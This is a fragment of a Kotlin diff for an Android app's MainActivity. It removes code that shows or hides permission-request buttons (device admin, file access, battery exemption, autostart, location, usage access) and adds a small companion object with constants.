-            if (SpappDeviceAdminReceiver.isActive(this)) android.view.View.GONE else android.view.View.VISIBLE
-
-        val hasFullFileAccess = Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager()
-        binding.btnGrantFileAccess.visibility =
-            if (hasFullFileAccess) android.view.View.GONE else android.view.View.VISIBLE
-
-        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
-        val hasBatteryExemption = powerManager.isIgnoringBatteryOptimizations(packageName)
-        binding.btnGrantBatteryExemption.visibility =
-            if (hasBatteryExemption) android.view.View.GONE else android.view.View.VISIBLE
-
-        // No public API to check autostart allowlist status on any OEM, so this
-        // stays visible whenever battery exemption also still needs granting —
-        // on MIUI the two are usually set together during initial setup.
-        binding.btnGrantAutostart.visibility =
-            if (hasBatteryExemption) android.view.View.GONE else android.view.View.VISIBLE
-
-        val anyOtherNeeded = !hasCameraPermission ||
-                !usageCollector.hasUsageAccess() ||
-                needsBackgroundLocation ||
-                !SpappDeviceAdminReceiver.isActive(this) ||
-                !hasFullFileAccess ||
-                !hasBatteryExemption
-        binding.tvOtherPermissionsHeader.visibility =
-            if (anyOtherNeeded) android.view.View.VISIBLE else android.view.View.GONE
+    companion object {
+        private const val TAG = "MainActivity"
+        private const val STATUS_REFRESH_MS = 30_000L
     }
 }
